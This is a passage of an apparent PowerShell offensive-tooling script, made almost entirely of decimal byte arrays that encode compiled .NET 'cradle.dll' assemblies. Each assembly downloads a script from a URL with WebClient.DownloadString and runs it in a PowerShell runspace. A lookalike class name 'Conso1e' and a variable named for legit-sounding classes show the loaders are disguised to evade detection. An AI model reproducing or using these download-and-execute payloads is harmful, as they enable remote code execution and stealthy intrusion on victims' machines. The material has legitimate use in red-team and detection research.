2,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,196,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,164,3,0,0,8,0,0,0,35,85,83,0,172,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,188,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,119,0,87,0,6,0,151,0,87,0,10,0,0,1,217,0,10,0,16,1,217,0,10,0,45,1,188,0,14,0,87,1,76,1,6,0,112,1,36,0,6,0,167,1,136,1,10,0,180,1,188,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,157,32,0,0,0,0,134,24,59,0,16,0,3,0,0,0,1,0,65,0,0,0,2,0,69,0,17,0,59,0,20,0,25,0,59,0,16,0,33,0,25,1,34,0,41,0,40,1,16,0,49,0,56,1,39,0,49,0,63,1,44,0,57,0,59,0,16,0,57,0,97,1,50,0,65,0,119,1,55,0,49,0,126,1,62,0,49,0,189,1,68,0,9,0,59,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(181,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(25,0,188,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,104,97,114,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,73,115,83,121,109,98,111,108,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,59,0,0,0,0,0,95,145,67,89,238,65,195,78,133,159,175,55,16,46,223,80,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,8,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Conso1e'       , 'OpenStandardError' , @("$CompiledHeader`169,52,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(48,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,184,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,220,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,84,2,0,0,8,0,0,0,35,85,83,0,92,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,108,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,108,0,76,0,6,0,140,0,76,0,10,0,192,0,181,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,109,32,0,0,0,0,134,24,70,0,15,0,2,0,0,0,1,0,177,0,17,0,70,0,19,0,25,0,70,0,15,0,33,0,70,0,15,0,33,0,202,0,24,0,9,0,70,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(170,0,0,0,2)+@(0)*11+@(1,0,29,0,0,0,0,0,2)+@(0)*11+@(1,0,38)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,111,110,115,111,49,101,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,79,112,101,110,83,116,97,110,100,97,114,100,69,114,114,111,114,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,0,3,32,0,0,0,0,0,166,202,155,42,37,101,215,73,169,249,219,22,39,200,227,131,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,88,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`192,52,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,254,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(168,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,4,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(224,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,12,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,176,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,128,3,0,0,8,0,0,0,35,85,83,0,136,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,152,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,112,0,80,0,6,0,144,0,80,0,10,0,249,0,210,0,10,0,9,1,210,0,10,0,38,1,181,0,14,0,80,1,69,1,6,0,146,1,115,1,10,0,159,1,181,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,146,32,0,0,0,0,134,24,70,0,15,0,2,0,0,0,1,0,76,0,17,0,70,0,19,0,25,0,70,0,15,0,33,0,18,1,33,0,41,0,33,1,15,0,49,0,49,1,38,0,49,0,56,1,43,0,57,0,70,0,15,0,57,0,90,1,49,0,49,0,105,1,54,0,49,0,168,1,60,0,9,0,70,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(174,0,0,0,4)+@(0)*11+@(1,0,29,0,0,0,0,0,3)+@(0)*11+@(24,0,181,0,0,0,0,0,4)+@(0)*11+@(1,0,38)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,111,110,115,111,49,101,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,79,112,101,110,83,116,97,110,100,97,114,100,69,114,114,111,114,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,32,0,0,0,0,0,144,122,188,143,165,78,182,72,137,244,171,128,110,52,236,156,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,208,36)+@(0)*8+@(0,0,238,36,0,0,0,32)+@(0)*22+@(224,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*266+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,0,53)+@(0)*502","$CompiledHeader`204,52,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,62,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(236,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,68,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(32,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,68,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,208,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,176,3,0,0,8,0,0,0,35,85,83,0,184,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,200,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,45,0,38,0,6,0,130,0,98,0,6,0,162,0,98,0,10,0,11,1,228,0,10,0,27,1,228,0,10,0,56,1,199,0,14,0,98,1,87,1,6,0,123,1,38,0,6,0,178,1,147,1,10,0,191,1,199,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,52,0,10,0,1,0,157,32,0,0,0,0,134,24,70,0,16,0,3,0,0,0,1,0,76,0,0,0,2,0,80,0,17,0,70,0,20,0,25,0,70,0,16,0,33,0,36,1,34,0,41,0,51,1,16,0,49,0,67,1,39,0,49,0,74,1,44,0,57,0,70,0,16,0,57,0,108,1,50,0,65,0,130,1,55,0,49,0,137,1,62,0,49,0,200,1,68,0,9,0,70,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(192,0,0,0,4)+@(0)*11+@(1,0,29,0,0,0,0,0,3)+@(0)*11+@(25,0,199,0,0,0,0,0,4)+@(0)*11+@(1,0,38)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,111,110,115,111,49,101,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,79,112,101,110,83,116,97,110,100,97,114,100,69,114,114,111,114,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,59,0,0,0,0,0,98,212,22,30,96,69,18,66,137,71,177,48,231,105,7,48,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,20,37)+@(0)*8+@(0,0,46,37,0,0,0,32)+@(0)*22+@(32,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*202+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,